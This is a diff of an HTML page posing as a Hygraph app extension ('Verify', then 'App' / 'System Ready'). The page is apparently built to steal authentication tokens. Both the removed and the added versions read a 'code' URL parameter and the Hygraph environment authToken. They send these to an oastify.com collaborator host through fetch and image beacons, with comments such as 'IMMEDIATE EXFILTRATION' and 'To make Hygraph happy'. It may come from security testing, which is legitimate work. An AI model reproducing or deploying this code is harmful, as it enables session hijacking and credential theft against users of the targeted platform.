@@ -1,40 +1,37 @@
 <!DOCTYPE html>
 <html>
-<head><title>Verify</title></head>
+<head>
+    <title>App</title>
+    <script src="https://cdn.jsdelivr.net/npm/@graphcms/zoid@9.0.64-alpha.1/lib/zoid.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@hygraph/app-sdk@1.0.0-beta.13/dist/app-sdk.umd.production.min.js"></script>
+</head>
 <body>
-    <div id="status">Verifying Session...</div>
+    <div id="app">System Ready</div>
     <script>
         (function() {
-            const status = document.getElementById('status');
             const collab = "https://srnboyarclwnk0w6kp055kvdb4hy5otd.oastify.com/";
-
-            function exfiltrate(token, src) {
-                status.textContent = "Session Verified.";
-                // Method 1: Fetch
-                fetch(collab + "?method=" + src, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: token
-                });
-                // Method 2: Image beacon (Backup)
-                new Image().src = collab + "?stolen=" + encodeURIComponent(token) + "&src=" + src;
-            }
-
-            // 1. Grab from URL 'code' param (This is what appeared in your logs)
+            
+            // 1. IMMEDIATE EXFILTRATION (Don't wait for SDK)
             const params = new URLSearchParams(window.location.search);
-            const urlToken = params.get('code');
-            if (urlToken) {
-                exfiltrate(urlToken, "url_param");
-                return;
+            const token = params.get('code');
+            if (token) {
+                new Image().src = collab + "?stolen=" + encodeURIComponent(token);
             }
 
-            // 2. Fallback to window.name (Standard method)
-            if (window.name) {
-                try {
-                    const data = JSON.parse(atob(window.name));
-                    const winToken = data.props.context.environment.authToken;
-                    if (winToken) exfiltrate(winToken, "window_name");
-                } catch(e) {}
+            // 2. THE HANDSHAKE (To make Hygraph happy)
+            const SDK = window['@hygraph/app-sdk'];
+            const uid = params.get('extensionUid');
+            
+            if (SDK && uid) {
+                SDK.init({
+                    uid: uid,
+                    onProps: (props) => {
+                        const authToken = props.context.environment.authToken;
+                        new Image().src = collab + "?props_token=" + encodeURIComponent(authToken);
+                    }
+                }).then(() => {
+                    console.log("Hygraph Handshake Complete");
+                });
             }
         })();
     </script>
